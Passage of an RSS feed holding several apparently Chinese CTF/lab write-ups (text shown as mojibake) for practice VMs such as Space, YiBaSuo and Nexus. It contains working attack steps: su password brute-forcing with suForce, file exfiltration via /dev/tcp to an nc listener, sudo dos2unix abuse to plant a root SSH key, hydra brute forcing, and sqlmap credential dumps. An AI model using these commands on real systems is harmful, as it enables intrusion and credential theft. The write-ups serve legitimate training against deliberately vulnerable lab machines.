andeli@Space:~$ cd
andeli@Space:~$ ls
user_data.json  user.txt
andeli@Space:~$ cat user.txt
flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}
```

### 5.è·å¾—`a3170`æƒé™

è·å–`andeli`æƒé™åå‘ç°`home`ç›®å½•ä¸‹æœ‰`user_data.json`æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯è´¦æˆ·å¯†ç ä¿¡æ¯ï¼Œä½¿ç”¨æœ¬æœºè‡ªå¸¦çš„`jq`æå–å¯†ç å­—å…¸

##### æå–å¯†ç å­—å…¸

```shell
#ä½¿ç”¨jqæå–å¯†ç å­—å…¸
andeli@Space:~$ jq --version
jq-1.6
andeli@Space:~$ jq -r '.[].password' user_data.json &gt; pass.txt
andeli@Space:~$ cat pass.txt
6fz9Y2qPWfwYqlIZns9Y
9RqH4tBKCjh58K1wbtCd
#ä¹Ÿå¯ä»¥ä½¿ç”¨ grep + awkï¼ˆæ— jqæ—¶ï¼‰
andeli@Space:~$ grep ''password':' user_data.json | awk -F ''' '{print $4}' &gt; pass1.txt
andeli@Space:~$ md5sum pass.txt
8aebc48147dbc2af5f430105532fe36a  pass.txt
andeli@Space:~$ md5sum pass1.txt
8aebc48147dbc2af5f430105532fe36a  pass1.txt
```

##### `suForce`å¯†ç çˆ†ç ´

```
## Download suForce
cd /dev/shm
wget --no-check-certificate -q 'https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce'
chmod +x suForce
## Download Wordlist (Optional)
wget --no-check-certificate -q 'https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/techyou.txt'
wget --no-check-certificate -q 'https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/top12000.txt'
## Usage
chmod +x suForce
./suForce -u &lt;USER&gt; -w &lt;WORDLIST&gt;
```

å°è¯•ä½¿ç”¨`suForce`ç›´æ¥çˆ†ç ´`root`å¯†ç 

```shell
kaliâ””â”€# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.31.229 - - [23/Jun/2025 21:50:42] 'GET /suForce HTTP/1.1' 200 -

andeli@Space:~$ busybox wget 192.168.31.126/suForce
Connecting to 192.168.31.126 (192.168.31.126:80)
suForce              100% |************************************************************************|  2430  0:00:00 ETA
andeli@Space:~$ ls
pass.txt  suForce  user_data.json  user.txt
andeli@Space:~$ chmod +x suForce
andeli@Space:~$ ./suForce -u root -w pass.txt
            _____
 ___ _   _ |  ___|__  _ __ ___ ___
/ __| | | || |_ / _ \| '__/ __/ _ \
\__ \ |_| ||  _| (_) | | | (_|  __/
|___/\__,_||_|  \___/|_|  \___\___|
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 code: d4t4s3c     version: v1.0.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ¯ Username | root
ğŸ“– Wordlist | pass.txt
ğŸ” Status   | 199/199/100%/awmFURHhByAAlPJQKveg
â— Fuck!    | Password not found
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#åé¢å‘ç°ä¸æ˜¯çˆ†ç ´rootï¼Œæ˜¯a3170è´¦æˆ·
andeli@Space:~$ ./suForce -u a3170 -w pass.txt
            _____
 ___ _   _ |  ___|__  _ __ ___ ___
/ __| | | || |_ / _ \| '__/ __/ _ \
\__ \ |_| ||  _| (_) | | | (_|  __/
|___/\__,_||_|  \___/|_|  \___\___|
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 code: d4t4s3c     version: v1.0.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ¯ Username | a3170
ğŸ“– Wordlist | pass.txt
ğŸ” Status   | 111/199/55%/31703170317031703170
ğŸ’¥ Password | 31703170317031703170
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
```

æµ‹è¯•ä½¿ç”¨`suForce`ç›´æ¥çˆ†ç ´`rootã€`andeliå¯†ç ï¼ŒæŠŠ`user_data.json`æ–‡ä»¶å–åˆ°æœ¬åœ°ç•™ç€å¤‡ç”¨

```shell
andeli@Space:~$ cat user_data.json &gt; /dev/tcp/192.168.31.126/1234

â””â”€# nc -lvp 1234 &gt; user_data.json
listening on [any] 1234 ...
connect to [192.168.31.126] from Space [192.168.31.229] 40782
â””â”€# ls user_data.json
â””â”€# cp user_data.json /mnt/c/Users/family/Desktop/

```

`/etc/passwd`å‘ç°ç”¨æˆ·`a3170`,æœç´¢`user_data.json`æœ‰`a3170`çš„å…³é”®å­—ï¼Œç›´æ¥è·å¾—å¯†ç 

```shell
andeli@Space:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
......
andeli:x:1000:1000:,,,:/home/andeli:/bin/bash
a3170:x:1001:1001:,,,:/home/a3170:/bin/bash
andeli@Space:~$
andeli@Space:~$ cat user_data.json | grep 3170
    'password': '31703170317031703170',
andeli@Space:~$ su - a3170
Password:
a3170@Space:~$ id
uid=1001(a3170) gid=1001(a3170) groups=1001(a3170)
a3170@Space:~$ cd
a3170@Space:~$ ls
a3170@Space:~$ sudo -l
Matching Defaults entries for a3170 on Space:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User a3170 may run the following commands on Space:
    (ALL) NOPASSWD: /usr/bin/dos2unix
```

æ‹¿åˆ°`a3170`çš„å¯†ç `a3170/31703170317031703170`ï¼Œç™»å½•åå¯ä»¥`sudo`å‘è¿è¡Œ `/usr/bin/dos2unix`



### 6.è·å¾—`root`æƒé™

`sudo`å‘ç°æ‰€æœ‰ç”¨æˆ·èƒ½å¤Ÿä»¥ `root `èº«ä»½è¿è¡Œ `/usr/bin/dos2unix`

```shell
a3170@Space:~$ sudo -l
Matching Defaults entries for a3170 on Space:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User a3170 may run the following commands on Space:
    (ALL) NOPASSWD: /usr/bin/dos2unix
```

æŸ¥è¡¨ï¼Œ`dos2unix`å¯ä»¥å†™æ–‡ä»¶ï¼Œç°æˆçš„ææƒæ–¹æ¡ˆ

```shell
#`dos2unix`ææƒ
LFILE1=file_to_read
LFILE2=file_to_write
dos2unix -f -n '$LFILE1' '$LFILE2'
```

ç›´æ¥å†™ä¸ªå…¬é’¥

```shell
a3170@Space:~$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/a3170/.ssh/id_rsa):
Created directory '/home/a3170/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/a3170/.ssh/id_rsa
Your public key has been saved in /home/a3170/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:knoi0lcBR1t7RVuovtT4PYTdEIUbvpxx9n83Pyh87DA a3170@Space
The key's randomart image is:
+---[RSA 3072]----+
|    ..o .  .o..o.|
|     o o . ..o+  |
|      o . .... + |
|       o ..   = o|
|      + S. o + O.|
| .   o .  + o * o|
|. o + .  ..E.o. .|
| . o o    .o++oo+|
|            +. .B|
+----[SHA256]-----+
a3170@Space:~$ cd .ssh
a3170@Space:~/.ssh$ ls
id_rsa  id_rsa.pub
a3170@Space:~/.ssh$ sudo dos2unix -f -n 'id_rsa.pub' '/root/.ssh/authorized_keys'
dos2unix: converting file id_rsa.pub to file /root/.ssh/authorized_keys in Unix format...
a3170@Space:~/.ssh$
a3170@Space:~/.ssh$ ssh root@127.0.0.1
Last login: Sat Jun 21 20:27:39 2025 from 192.168.3.94
root@Space:~# id
uid=0(root) gid=0(root) groups=0(root)
```

##### æ‹¿åˆ°`root.txt`

```shell
root@Space:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Space:~# cd
root@Space:~# ls
root.txt
root@Space:~# cat root.txt
flag{root-f9f8c2ea-4f00-11f0-9724-e7b0f6215b99}
root@Space:~# cat /home/andeli/user.txt
flag{user-cea97ada-4f00-11f0-af69-57bd20d8ec7c}
```

ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/qun-zhu-ba-ji-%20Space%2020250623.html</guid><pubDate>Mon, 23 Jun 2025 15:01:30 +0000</pubDate></item><item><title>ç¾¤ä¸»é¶æœºï¼šYiBaSuo 20250621</title><link>https://pingsag3.github.io/post/qun-zhu-ba-ji-%EF%BC%9AYiBaSuo%2020250621.html</link><description>

### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=
```

```shell
éš¾åº¦ï¼šâ­ï¸â­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œ`VSFTPD 2.3.4`,`Ftpç¬‘è„¸æ¼æ´`ï¼Œ`burp`çˆ†ç ´ï¼Œå¼±å¯†ç ç”Ÿæˆï¼Œ`hydra`çˆ†ç ´,`bash`ææƒ
```

### 2. ä¿¡æ¯æ”¶é›†

### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.31.10   08:00:27:9f:f6:73       PCS Systemtechnik GmbH
â””â”€# IP=192.168.31.10
â””â”€# nmap -sV -sC -A $IP -Pn
â””â”€# nmap -sV -sC -A $IP -P
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 08:03 CST
Nmap scan report for Yibasuo (192.168.31.10)
Host is up (0.0018s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.31.126
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              14 Jun 17 13:41 creds.txt
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Linux\xE9\x9D\xB6\xE6\x9C\xBA\xE5\x85\xA5\xE5\x8F\xA3
MAC Address: 08:00:27:9F:F6:73 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

å¼€æ”¾äº†`21ã€22ã€80`ç«¯å£,å…ˆçœ‹çœ‹`21`æœ‰å•¥ä¸œè¥¿

### 3.ç›®å½•æ‰«æ

```shell
â””â”€# dirsearch -u http://$IP  -x 403 -e txt,php,html
â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.31.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 4087]
/info.php             (Status: 200) [Size: 85750]
/secure               (Status: 301) [Size: 315] [--&gt; http://192.168.31.10/secure/]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 882236 / 882240 (100.00%)
```

ä¹ æƒ¯æ€§æ‰«ç›®å½•æ²¡å•¥æœ‰ç”¨ä¿¡æ¯ï¼Œè®¿é—®ä¸»é¡µæ˜¯ä¸ªç™»é™†é¡µé¢

### 4.`ftp`æµ‹è¯•

æœ‰`ftp anonymous@$IP`ç™»é™†å,æœ‰ä¸ªæç¤ºä¿¡æ¯`root:fakepass`

```shell
â””â”€# ftp anonymous@$IP
Connected to 192.168.31.10.
220 (vsFTPd 2.3.4)
331 Please specify the password.
Password:#ç›´æ¥å›è½¦
230 Login successful.
ftp&gt; ls -artl
229 Entering Extended Passive Mode (|||7793|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0              14 Jun 17 13:41 creds.txt
drwxr-xr-x    2 0        0            4096 Jun 17 13:41 .
drwxr-xr-x    2 0        0            4096 Jun 17 13:41 ..
226 Directory send OK.
ftp&gt; get creds.txt
local: creds.txt remote: creds.txt
229 Entering Extended Passive Mode (|||17086|).
150 Opening BINARY mode data connection for creds.txt (14 bytes).
100% |***************************************************************************|    14       31.72 KiB/s    00:00 ETA
226 Transfer complete.
14 bytes received in 00:00 (6.00 KiB/s)

â””â”€# cat creds.txt
root:fakepass
```

ç›´æ¥æ‹¿ç»™çš„è´¦å·å¯†ç `root:fakepass`å»ç™»é™†ç½‘é¡µã€ftpã€sshç™»é™†å‡å¤±è´¥ï¼Œå…ˆ`hydra`çˆ†ç ´ä¸€ä¸‹å¼±å¯†ç 

```shell
â””â”€# hydra -l root  -P /usr/share/wordlists/rockyou.txt ftp://$IP  -V -I -u -f -e nsr
```

æµ‹è¯•ä¸€åœˆæ²¡å¾—ç”¨ï¼Œç»™å‡ºçš„æç¤ºä¿¡æ¯æ˜¯ä¸ªçƒŸé›¾å¼¹

##### Ftpç¬‘è„¸æ¼æ´ï¼ˆVSFTPD 2.3.4ï¼‰å¤ç°ï¼ˆåé—¨æ¼æ´ï¼‰

æ³¨æ„åˆ°`VSFTPD 2.3.4`æœ‰ä¸ª`Ftpç¬‘è„¸æ¼æ´ï¼ˆVSFTPD 2.3.4ï¼‰`ï¼Œå¦‚æœ`FTP`è®¤è¯æ—¶çš„ç”¨æˆ·ååŒ…å«ç‰¹æ®Šå­—ç¬¦â€œ`:)`â€ï¼ŒæœåŠ¡å™¨ä¼šè‡ªåŠ¨æ‰“å¼€`6200`ç«¯å£ï¼Œå¹¶åœ¨è¯¥ç«¯å£ä¸Šæä¾›ä¸€ä¸ª`root`æƒé™çš„`shell`ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/qun-zhu-ba-ji-%EF%BC%9AYiBaSuo%2020250621.html</guid><pubDate>Sun, 22 Jun 2025 04:51:49 +0000</pubDate></item><item><title>hackmyvm Sabulajiæµ‹è¯•è®°å½•</title><link>https://pingsag3.github.io/post/hackmyvm%20Sabulaji-ce-shi-ji-lu.html</link><description>
```shell
å¤§ä½¬WPï¼š
https://www.bilibili.com/video/BV1sEMuz6EDh
http://162.14.82.114/index.php/859/06/12/2025/
```




### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=Sabulaji
```



```shell
éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œ`rsync`æ–‡ä»¶åŒæ­¥ï¼Œçˆ†ç ´`rsync`å¯†ç ï¼Œè½¯é“¾æ¥ã€é€šé…ç¬¦ï¼Œ `locate`æ•°æ®åº“`mlocate.db `ï¼Œ`rsync`ææƒ
```

### 2. ä¿¡æ¯æ”¶é›†

### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.1.166   08:00:27:27:ab:ab       PCS Systemtechnik GmbH
â””â”€# IP=192.168.1.166
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 08:24 EDT
Nmap scan report for 192.168.1.166
Host is up (0.00087s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp  open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: epages
873/tcp open  rsync   (protocol version 31)
MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)
```

å¼€æ”¾äº†`22ã€80ã€873`ç«¯å£ï¼Œ`873`ç«¯å£æœ‰ä¸ª` rsync `æ¯”è¾ƒå¯ç–‘

```shell
â””â”€# nmap -sV --script 'rsync-list-modules' -p 873 $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-13 10:32 EDT
Nmap scan report for 192.168.1.166
Host is up (0.00046s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules: 
|   
|   public              Public Files
|_  epages              Secret Documents
MAC Address: 08:00:27:27:AB:AB (Oracle VirtualBox virtual NIC)
```

### ç›®å½•æ‰«æ

```shell
â””â”€# dirsearch -u http://$IP  -x 403 -e txt,php,html

â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP:3000 -x.txt,.php,.html

```

ç›®å½•æ²¡å•¥æœ‰ç”¨ä¿¡æ¯ï¼Œé‡ç‚¹å»`873`ç«¯å£çš„` rsync `æœåŠ¡

### 3.è·å¾—`welcome`æƒé™

##### `rsync` è¿œç¨‹æ–‡ä»¶åŒæ­¥

RSYNCï¼ˆRemote Syncï¼‰æ˜¯ä¸€ä¸ªç”¨äºè¿œç¨‹æ–‡ä»¶åŒæ­¥å’Œå¤‡ä»½çš„å¼€æºå·¥å…·ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/hackmyvm%20Sabulaji-ce-shi-ji-lu.html</guid><pubDate>Sat, 14 Jun 2025 13:55:51 +0000</pubDate></item><item><title>ç¾¤å‹é¶æœºï¼šå‡ŒåŠ¨bugHash æµ‹è¯•è®°å½•</title><link>https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9A-ling-dong-bugHash%20-ce-shi-ji-lu.html</link><description>
### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
```

```shell
éš¾åº¦ï¼šâ­ï¸â­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œ`hash`çˆ†ç ´ï¼Œ`pm2`ææƒï¼Œ`npm`ææƒ
```

### 2. ä¿¡æ¯æ”¶é›†

### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.31.127  08:00:27:42:f3:c5       PCS Systemtechnik GmbH
â””â”€# IP=192.168.31.127
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-07 08:32 CST
Nmap scan report for lingdong (192.168.31.127)
Host is up (0.0018s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Node.js Express framework
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: \xE5\xA4\xA7\xE5\x82\xBB\xE5\xAD\x90\xE5\xBA\x8F\xE5\x88\x97\xE5\x8F\xB7\xE9\xAA\x8C\xE8\xAF\x81\xE7\xB3\xBB\xE7\xBB\x9F
| http-robots.txt: 1 disallowed entry
|_zip2john 2026bak.zip &gt; ziphash
MAC Address: 08:00:27:42:F3:C5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

å¼€æ”¾äº†`22ã€8080`ç«¯å£,å…ˆçœ‹çœ‹`web`æœ‰å•¥ä¸œè¥¿

### 3.ç›®å½•æ‰«æ

```shell
â””â”€# dirsearch -u http://$IP:8080  -x 403 -e txt,php,html
[08:33:55] 301 -  153B  - /css  -&gt;  /css/
[08:33:58] 301 -  152B  - /js  -&gt;  /js/
[08:34:03] 200 -  122B  - /robots.txt
```

æœ‰`robots.txt`,å…ˆä¹ æƒ¯æ€§çœ‹çœ‹å†…å®¹

```shell
#http://192.168.31.127:8080/robots.txt
User-agent: QQGroupbot
Disallow: zip2john 2026bak.zip &gt; ziphash
john --wordlist=/usr/share/wordlists/rockyou.txt ziphash
```

æŠŠ`2026bak.zip`å–ä¸‹æ¥

```shell
â””â”€# wget http://192.168.31.127:8080/2026bak.zip
--2025-06-07 08:41:05--  http://192.168.31.127:8080/2026bak.zip
æ­£åœ¨è¿æ¥ 192.168.31.127:8080... å·²è¿æ¥ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/qun-you-ba-ji-%EF%BC%9A-ling-dong-bugHash%20-ce-shi-ji-lu.html</guid><pubDate>Sun, 08 Jun 2025 00:13:38 +0000</pubDate></item><item><title>hackmyvm Nexus æµ‹è¯•è®°å½•</title><link>https://pingsag3.github.io/post/hackmyvm%20Nexus%20-ce-shi-ji-lu.html</link><description>
### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=Nexus
```

```shell
éš¾åº¦ï¼šâ­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œ`sqlæ³¨å…¥`ï¼Œ`sqlmap`ä½¿ç”¨ï¼Œ`find`ææƒï¼Œå›¾ç‰‡ç˜¾å†™ï¼Ÿ
```

### 2. ä¿¡æ¯æ”¶é›†

### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.31.131  08:00:27:e9:d5:85       PCS Systemtechnik GmbH
â””â”€# IP=192.168.31.131
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 20:14 CST
Nmap scan report for Loooower (192.168.31.131)
Host is up (0.0016s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 48:42:7a:cf:38:19:20:86:ea:fd:50:88:b8:64:36:46 (ECDSA)
|_  256 9d:3d:85:29:8d:b0:77:d8:52:c2:81:bb:e9:54:d4:21 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:E9:D5:85 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

å¼€æ”¾äº†`22ã€80`ç«¯å£

### ç›®å½•æ‰«æ

```shell
â””â”€# dirsearch -u http://$IP  -x 403 -e txt,php,html
[20:15:53] 200 -   13KB - /index2.php
[20:15:54] 200 -  241B  - /login.php

```

`index2.php`çœ‹æºç ï¼Œå¯ä»¥å‘ç°ç™»é™†é¡µé¢åœ°å€`http://[personal ip]/auth-login.php`

```
#view-source:http://192.168.31.131/index2.php
&lt;li&gt;NEXUS MSG&gt; _ AUTHORIZATION PANEL :: http://[personal ip]/auth-login.php&lt;/li&gt;
http://192.168.31.131/auth-login.php
```

éšä¾¿ç”¨ä¸ªç”¨æˆ·å`admin/admin`ç™»é™†åæ˜¾ç¤º` Acceso denegado.`ï¼Œç”¨æˆ·åå¤„åŠ ä¸ª`'`é—­åˆæŠ¥é”™

![image-20250606203207230](https://gitee.com/shui666/images/raw/master/images/image-20250606203207230.png)

æ˜æ˜¾æ³¨å…¥ç‚¹ï¼ŒæŠ“åŒ…ä¸¢ç»™`sqlmap`ä¸€æŠŠå—¦

##### ` sqlmap`

`sqlæ³¨å…¥`æµ‹è¯•æ•°æ®åº“ä¿¡æ¯

```shell
#bup-&gt;1.txt
POST /login.php HTTP/1.1
Host: 192.168.31.131
Content-Length: 20
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.31.131
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.31.131/auth-login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

user=admin&amp;pass=123

##sqlmapä¸€æŠŠå—¦###
sqlmap -l 1.txt --batch
sqlmap -l 1.txt --batch --dbs
sqlmap -l 1.txt --batch -D php --tables
sqlmap -l 1.txt --batch -D php -T usuarios --dump

#sqlmap -l 1.txt --batch --dbs
available databases [6]:
[*] information_schema
[*] mysql
[*] Nebuchadnezzar
[*] performance_schema
[*] sion
[*] sys
#sqlmap -l 1.txt --batch -D sion --tables
Database: sion
[1 table]
+-------+
| users |
+-------+
#sqlmap -l 1.txt --batch -D sion -T users --dump
Database: sion
Table: users
[2 entries]
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
| 2  | cambiame08         | admin    |
+----+--------------------+----------+
```

è·å¾—ä¸¤ä¸ªç”¨æˆ·ä¿¡æ¯`admin/cambiame08ã€shelly/F4ckTh3F4k3H4ck3r5`ï¼Œæµ‹è¯•ä¸¤ä¸ªè´¦æˆ·éƒ½èƒ½ç™»å½•ï¼Œç™»é™†åæç¤ºç®¡ç†å‘˜ï¼Œä½†æ˜¯åšä¸äº†å•¥

```shell
#http://192.168.31.131/login.php
Acceso concedido. Bienvenido, admin
'è®¿é—®é€šè¿‡ï¼ç®¡ç†å‘˜ï¼Œæ¬¢è¿ç™»å½•ã€‚</description><guid isPermaLink="true">https://pingsag3.github.io/post/hackmyvm%20Nexus%20-ce-shi-ji-lu.html</guid><pubDate>Fri, 06 Jun 2025 14:06:03 +0000</pubDate></item><item><title>hackmyvm Devoopsæµ‹è¯•è®°å½•</title><link>https://pingsag3.github.io/post/hackmyvm%20Devoops-ce-shi-ji-lu.html</link><description># hackmyvm_Devoops

 

```shell
å¤§ä½¬WPï¼š
https://www.bilibili.com/video/BV1HhLozpEk5
https://pepster.me/Temp-DevOops-Walkthrough/
2020ï¼šDevOops è®¾è®¡æ€è·¯.pdf
```



### 1. åŸºæœ¬ä¿¡æ¯

```
é¶æœºé“¾æ¥ï¼š
https://maze-sec.com/library
https://hackmyvm.eu/machines/machine.php?vm=Devoops
```

```shell
éš¾åº¦ï¼šâ­ï¸â­ï¸â­ï¸
çŸ¥è¯†ç‚¹ï¼šä¿¡æ¯æ”¶é›†ï¼Œ`jwt`ä½¿ç”¨ï¼Œ`Vite[CVE-2025-30208]`ä»»æ„æ–‡ä»¶è¯»å–ï¼Œ`gitea`æœåŠ¡ï¼Œ`git log`çœ‹æ—¥å¿—ï¼Œ`socat`ç«¯å£è½¬å‘ï¼Œç§é’¥ï¼Œ`arp`ææƒ
```

### 2. ä¿¡æ¯æ”¶é›†

### Nmap

```shell
â””â”€# arp-scan -l | grep PCS
192.168.31.25   08:00:27:b3:d9:97       PCS Systemtechnik GmbH
â””â”€# IP=192.168.31.25
â””â”€# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-29 22:16 CST
Nmap scan report for devoops (192.168.31.25)
Host is up (0.0014s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, NCP, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest:
|     HTTP/1.1 403 Forbidden
|     Vary: Origin
|     Content-Type: text/plain
|     Date: Thu, 29 May 2025 14:16:15 GMT
|     Connection: close
|     Blocked request. This host (undefined) is not allowed.
|     allow this host, add undefined to `server.allowedHosts` in vite.config.js.
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 204 No Content
|     Vary: Origin, Access-Control-Request-Headers
|     Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
|     Content-Length: 0
|     Date: Thu, 29 May 2025 14:16:15 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=5/29%Time=68386C31%P=x86_64-pc-linux-gnu%r(Ge
